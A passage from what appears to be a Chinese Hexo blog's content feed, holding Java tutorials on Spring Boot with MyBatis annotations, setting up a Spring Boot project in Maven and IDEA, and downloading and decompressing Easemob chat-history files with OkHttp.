   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPhone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPhone</span><span class="params">(String phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getImageSrc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> imageSrc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setImageSrc</span><span class="params">(String imageSrc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.imageSrc = imageSrc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setManager</span><span class="params">(String manager)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.manager = manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, phone=&#x27;&quot;</span> + phone + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, imageSrc=&#x27;&quot;</span> + imageSrc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, manager=&#x27;&quot;</span> + manager + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建UserMapper.java接口，并添加@Mapper注解，使用@Select(“select * from user”)注解方式写查询语句：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.tx.datasource.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findUser</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建Controller类：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findUser&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;User&gt; <span class="title">findUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.findUser();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>创建主启动类MyApplication：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.datasource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>到此为止springboot整合MyBatis的注解方式完成，运行主启动类的main函数，访问<a href="http://localhost:8080/findUser可以看到成功查询数据。">http://localhost:8080/findUser可以看到成功查询数据。</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
          <category> 整合MyBatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot应用搭建</title>
      <link href="2021/05/08/springboot%E5%BA%94%E7%94%A8%E6%90%AD%E5%BB%BA/"/>
      <url>2021/05/08/springboot%E5%BA%94%E7%94%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="springboot应用搭建"><a href="#springboot应用搭建" class="headerlink" title="springboot应用搭建"></a>springboot应用搭建</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><div class="note green no-icon flat"><p>jdk1.8：Spring Boot推荐jdk1.8及以上版本；</p><p>Maven3.x：Maven3.3以上版本；</p><p>IntelliJIDEA2019</p><p>SpringBoot2.3.10RELEASE</p><p>SpringBoot内置了Servlet容器：Tomcat9.0   ServletVersion  4.0</p></div><h2 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h2><p>修改Maven的settings.xml文件</p><h3 id="配置Maven镜像提高下载速度"><a href="#配置Maven镜像提高下载速度" class="headerlink" title="配置Maven镜像提高下载速度"></a>配置Maven镜像提高下载速度</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="配置Maven的profiles标签添加profile"><a href="#配置Maven的profiles标签添加profile" class="headerlink" title="配置Maven的profiles标签添加profile"></a>配置Maven的profiles标签添加profile</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IDEA配置"><a href="#IDEA配置" class="headerlink" title="IDEA配置"></a>IDEA配置</h2><div class="note green no-icon flat"><p>1.配置jdk和Maven仓库路径</p></div><ul><li>点击 Configure —&gt; 选择Structure for New Projects</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/AWd3FOJIbCy2QYq.png" alt="IDEA配置01.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/2j9fpcAtGV6YEhw.png" alt="IDEA配置02.png"></p><ul><li>选择Project —&gt; 选择jdk版本为1.8 —&gt; 点击OK</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/jPDmxTceF36kU78.png" alt="IDEA配置03.png"></p><ul><li>点击Configure  —&gt; 选择Settings</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/HUu5WdRAVzxkYKN.png" alt="IDEA配置04.png"></p><ul><li>选择Builld Tools下的Maven —&gt; 配置Maven仓库地址 （Maven要大于3.3的） —&gt;点击OK</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/ALIEPeaNC51Utxq.png" alt="IDEA配置05.png"></p><div class="note green no-icon flat"><p>2.创建Maven管理的项目</p></div><ul><li>点击Create New Project</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/Dy2boKJwH8FlIEN.png" alt="IDEA配置06.png"></p><ul><li>选择Maven —&gt; 选择SDK大于或等于1.8的 —&gt;点击Next</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/TpXYQE9ARJ7txKh.png" alt="IDEA配置07.png"></p><ul><li>填写GroupID和Artifactd —&gt; 点击Next</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/DYk7IvaHZjltyJB.png" alt="IDEA配置08.png"></p><ul><li>填写项目名称和项目地址—&gt;点击Finish</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/4JUMbdQrykwOC8N.png" alt="IDEA配置09.png"></p><div class="note green no-icon flat"><p>3.第一个springBoot应用</p></div><ul><li><p>在pom.xml文件中导入依赖</p>  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.tx.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tx_sboot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 该工程下的子工程module --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;modules&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;springboot-first&lt;/module&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;springboot-profile&lt;/module&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;java-spi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">        &lt;module&gt;springboot-datasource&lt;/module&gt;</span></span><br><span class="line"><span class="comment">    &lt;/modules&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置为父工程 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- starter-parent里面管理了springboot所有的starter --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- web服务依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 代码自动提示依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在src/main/java包下创建一个cn.tx.springboot子包，并在这个子包下创建一个TestController.java文件：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;访问hello界面！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello springboot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在cn.tx.springboot包下创建一个启动类FirstSpringApplication.java文件：</p>  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.tx.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstSpringApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(FirstSpringApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>现在运行启动类的main函数，访问（<a href="http://localhost:8080/test/hello）便可以看到访问成功界面，如下图所示：">http://localhost:8080/test/hello）便可以看到访问成功界面，如下图所示：</a></p><p>  <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo@1.0.9/SpringBoot_yingyongdajian/j6JfLFyXKx1EbIa.png" alt="1625124531818.png"></p></li><li><p>可以再resources目录下创建一个application.properties文件，并在文件中配置服务访问的端口号：</p>  <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br></pre></td></tr></table></figure><p>  然后访问（<a href="http://localhost:8081/test/hello），同样可以成功访问。">http://localhost:8081/test/hello），同样可以成功访问。</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
          <category> SpringBoot应用搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环信拉取聊天记录并解析</title>
      <link href="2021/04/26/%E7%8E%AF%E4%BF%A1%E6%8B%89%E5%8F%96%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%B9%B6%E8%A7%A3%E6%9E%90/"/>
      <url>2021/04/26/%E7%8E%AF%E4%BF%A1%E6%8B%89%E5%8F%96%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E5%B9%B6%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="环信拉取聊天记录并解析"><a href="#环信拉取聊天记录并解析" class="headerlink" title="环信拉取聊天记录并解析"></a>环信拉取聊天记录并解析</h2><p>环信返回的聊天记录文件下载地址下载的文件是.gz格式的压缩文件。如果直接下载的话输出流创建的文件必须是.gz格式压缩文件，否则会乱码。我这里是直接下载、解压、写入内存、读取写入内存的文件、转换字符串、解析json字符串为对象（解析json字符串使用了lombok和GsonFormat插件生成ChatMessageHistory类和DownLoadMessageUrl类）一起完成的。</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*日期格式：yyyyMMddHH</span></span><br><span class="line"><span class="comment">*String date 历史消息日期 列如：&quot;2021042422&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">(String date)</span></span>&#123;</span><br><span class="line">        OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">            .url(<span class="string">&quot;https://a1.easemob.com/#&#123;Orgname&#125;/#&#123;Appname&#125;/chatmessages/&quot;</span>+date)</span><br><span class="line">                .header(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">                .header(<span class="string">&quot;Authorization&quot;</span>,<span class="string">&quot;Bearer #&#123;token&#125;&quot;</span>)</span><br><span class="line">                .get()</span><br><span class="line">                .build();</span><br><span class="line">        okHttpClient.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;onFailure3: &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                System.out.println(response.protocol() + <span class="string">&quot;:&quot;</span> +response.code() + <span class="string">&quot;: &quot;</span> + response.message());</span><br><span class="line">                Headers headers = response.headers();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; headers.size(); i++) &#123;</span><br><span class="line">                    System.out.println(headers.name(i) + <span class="string">&quot;:&quot;</span> + headers.value(i));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//请求成功，获得json字符串</span></span><br><span class="line">                String messageUrlJson =  response.body().string();</span><br><span class="line">                <span class="comment">//解析json字符串</span></span><br><span class="line">                DownLoadMessageUrl downLoadMessageUrl = JSON.parseObject(messageUrlJson,DownLoadMessageUrl.class);</span><br><span class="line">                System.out.println(<span class="string">&quot;解析后得到的地址：&quot;</span>+downLoadMessageUrl.getData().get(<span class="number">0</span>).getUrl());</span><br><span class="line">                String messageFileUrl = downLoadMessageUrl.getData().get(<span class="number">0</span>).getUrl();</span><br><span class="line">                downLoadFile(messageFileUrl,date);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下载聊天记录文件.gz并解压</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">downLoadFile</span><span class="params">(String messageFileUrl,String date)</span></span>&#123;</span><br><span class="line">        String sourcedir = <span class="string">&quot;G:\\test\\&quot;</span>+date+<span class="string">&quot;.gz&quot;</span>;</span><br><span class="line"></span><br><span class="line">        OkHttpClient okHttpClient = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                .url(messageFileUrl)</span><br><span class="line">                .get()</span><br><span class="line">                .build();</span><br><span class="line">        okHttpClient.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;downLoadFile: &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                System.out.println(response.protocol() + <span class="string">&quot;:&quot;</span> +response.code() + <span class="string">&quot; : &quot;</span> + response.message());</span><br><span class="line">                Headers headers = response.headers();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; headers.size(); i++) &#123;</span><br><span class="line">                    System.out.println(headers.name(i) + <span class="string">&quot;:&quot;</span> + headers.value(i));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//下载并解压.gz文件</span></span><br><span class="line">                unGzipFile(sourcedir,response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下载并解压.gz文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unGzipFile</span><span class="params">(String sourcedir,Response response)</span> </span>&#123;</span><br><span class="line">        String ouputfile = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        InputStream fin = <span class="keyword">null</span>;</span><br><span class="line">        GZIPInputStream gzin = <span class="keyword">null</span>;</span><br><span class="line">        FileOutputStream fout = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//建立gzip压缩文件输入流</span></span><br><span class="line">            fin=response.body().byteStream();</span><br><span class="line">            <span class="comment">//建立gzip解压工作流</span></span><br><span class="line">            gzin = <span class="keyword">new</span> GZIPInputStream(fin);</span><br><span class="line">            <span class="comment">//分割压缩文件存储路径，获得解压后文件的存储路径</span></span><br><span class="line">            ouputfile = sourcedir.substring(<span class="number">0</span>,sourcedir.lastIndexOf(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;解压后的文件路径及名称：&quot;</span>+ouputfile);</span><br><span class="line">            <span class="comment">//建立解压文件输出流</span></span><br><span class="line">            fout = <span class="keyword">new</span> FileOutputStream(ouputfile);</span><br><span class="line">            <span class="keyword">int</span> num;</span><br><span class="line">            <span class="keyword">byte</span>[] buf=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];<span class="comment">//建立缓冲字节数组</span></span><br><span class="line">            <span class="comment">//将解压后的文件流写入文件</span></span><br><span class="line">            <span 